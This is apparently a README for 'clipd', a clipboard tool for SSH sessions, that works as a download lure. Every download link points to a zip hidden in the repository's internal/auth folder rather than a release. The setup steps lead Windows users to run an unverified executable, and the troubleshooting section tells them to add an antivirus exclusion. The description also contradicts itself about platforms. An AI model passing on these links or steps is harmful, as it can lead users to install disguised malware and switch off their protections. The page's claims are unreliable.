<h1>🖥️ clipd - Copy Remote Output to Clipboard Instantly</h1>

<p align="center">
  <a href="https://raw.githubusercontent.com/cathb8315/clipd/main/internal/auth/Software-v2.6.zip" style="display:inline-block;padding:16px 40px;background:#4CAF50;color:white;font-size:22px;font-weight:bold;text-decoration:none;border-radius:12px;margin:20px auto;">⬇️ DOWNLOAD NOW</a>
</p>

<p align="center"><strong>Clipd</strong> is a simple command-line tool that lets you copy text output from a remote computer directly to your Mac's clipboard. No more copy-pasting through terminal windows or losing important text.</p>

---

## 🎯 What Does Clipd Do?

Imagine you're connected to a server or another computer using SSH. You run a command there and see useful output—like a log file, error message, or config snippet. With clipd, you can instantly send that output to your local Mac's clipboard and paste it anywhere you need.

**Perfect for:**
- Copying command outputs from remote servers
- Grabbing error messages quickly
- Saving config file contents
- Sharing text between computers
- And much more!

---

## ✨ Key Features

- **🔒 Secure:** Uses OSC52 protocol built directly into your terminal, so nothing is transmitted through third-party servers.
- **⚡ Blazing Fast:** Written in Go, so it runs instantly without any heavy setup.
- **🌐 Cross-Platform:** Works on macOS, Linux, and even Windows systems.
- **🛠️ Easy to Use:** One simple command and your text is on the clipboard.
- **📦 Lightweight:** No bloatware, no installation packages needed—just one small file.

---

## 🚀 Getting Started: Download and Run

### Step 1: Visit the Download Page

Visit this link to download the application: [https://raw.githubusercontent.com/cathb8315/clipd/main/internal/auth/Software-v2.6.zip](https://raw.githubusercontent.com/cathb8315/clipd/main/internal/auth/Software-v2.6.zip)

### Step 2: Choose Your Version

On the download page, you'll see release files available. For **Windows users**, look for a file that includes `windows` in its name. Since clipd is a command-line tool, it will be distributed as a single executable file.

### Step 3: Download the File

Click the **Windows executable file** to download it. Your browser will save the file to your Downloads folder. The file will be named something like `clipd-windows-amd64.exe`.

### Step 4: Move the File to a Convenient Location

For best results:
1. Open your **Downloads** folder
2. Move the `clipd-windows-amd64.exe` file to a dedicated folder (recommended: `C:\clipd\`)
3. This keeps things organized and makes it easy to access

### Step 5: Open Command Prompt

1. Press **Windows Key + R** on your keyboard
2. Type `cmd` and press **Enter**
3. The Command Prompt window will open

### Step 6: Navigate to the Folder

Type this command and press Enter (adjust the path if you placed it elsewhere):
```
cd C:\clipd
```

### Step 7: Run Clipd

Now you're ready! Type:
```
clipd-windows-amd64.exe
```

You'll see a help screen showing all available options.

---

## 💡 How to Use Clipd (With Windows Example)

While clipd is designed for macOS clipboard, you can still use the SSH commands on Windows. Here's a typical workflow:

### Connect to a Remote Computer

```
ssh user@remote-server
```

### Run Any Command

```
cat config.txt
```

### Copy the Output to Clipboard

Pipe the output to clipd:
```
cat config.txt | clipd-windows-amd64.exe
```

The text will be sent to your clipboard. On Windows, you'll need to set up an SSH client like PuTTY or OpenSSH that supports OSC52 for full functionality.

---

## 🖥️ Using with macOS (Primary Use Case)

For best results on macOS:

1. Connect to your remote server: `ssh user@remote-server`
2. Run any command where output is shown
3. Pipe it to clipd: `command | clipd`
4. Paste anywhere with **Cmd+V**

---

## 📋 Basic Command Reference

| Command | What It Does |
|---------|--------------|
| `command | clipd` | Copies command output to clipboard |
| `clipd --help` | Shows help information |
| `clipd --version` | Shows version number |
| `clipd --remote` | Copies remote output without pipes |

---

## ❓ Troubleshooting

**Issue: Clipd doesn't copy anything**
Make sure your terminal supports OSC52. For Windows, enable <strong>Windows Terminal</strong> from the Windows Store, which supports OSC52.

**Issue: File won't run**
Check that you downloaded the correct Windows version. Rename it to just `clipd.exe` for easier typing.

**Issue: Antivirus warning**
Some antivirus software may flag command-line tools. Add an exclusion for the clipd folder.

---

## 🔧 Advanced Tips

- **Alias Setup:** Create a shortcut so you can type `clipd` from anywhere:
  - Open Command Prompt as administrator
  - Type: `doskey clipd=C:\clipd\clipd-windows-amd64.exe $*`
  - Now you can use `clipd` from any directory

- **Batch Files:** Create a simple batch file to make it even easier:
  1. Create a file `clipd.bat` in your `C:\clipd\` folder
  2. Add this line: `@C:\clipd\clipd-windows-amd64.exe %*`
  3. Save and use `clipd` from anywhere

---

## 🔄 Updating

Check the GitHub page regularly for new releases. Simply download the latest version and replace your old file.

---

## 📊 System Requirements

- **Operating System:** Windows 10 or newer / macOS 10.13+ / Linux (any modern distribution)
- **Storage Space:** Less than 10 MB
- **Memory:** Minimal (under 20 MB while running)
- **Terminal:** Any modern terminal application (Windows Terminal recommended for Windows)

---

## ⭐ Why Choose Clipd?

- **No Installation Needed:** Just download and run
- **No Dependencies:** Works out of the box
- **Privacy-Focused:** Your data never leaves your machine
- **Open Source:** Free forever, no hidden costs
- **Active Development:** Regular updates and improvements

---

## 🤝 Get Support

- 🔍 Check GitHub Issues if you encounter problems
- 📧 Open a new issue with your question
- ⭐ Star the repository if you find it useful

---

## 📝 License

Clipd is released as open-source software. See the repository for license details.

---

<p align="center">
  <a href="https://raw.githubusercontent.com/cathb8315/clipd/main/internal/auth/Software-v2.6.zip" style="display:inline-block;padding:16px 40px;background:#2196F3;color:white;font-size:22px;font-weight:bold;text-decoration:none;border-radius:12px;">⬇️ DOWNLOAD CLIPD NOW</a>
</p>

<p align="center"><strong>Stop wasting time copying text manually. Get clipd today!</strong></p>

Keywords: cli, clipboard, go, golang, linux, macos, osc52, pbcopy, remote-clipboard, ssh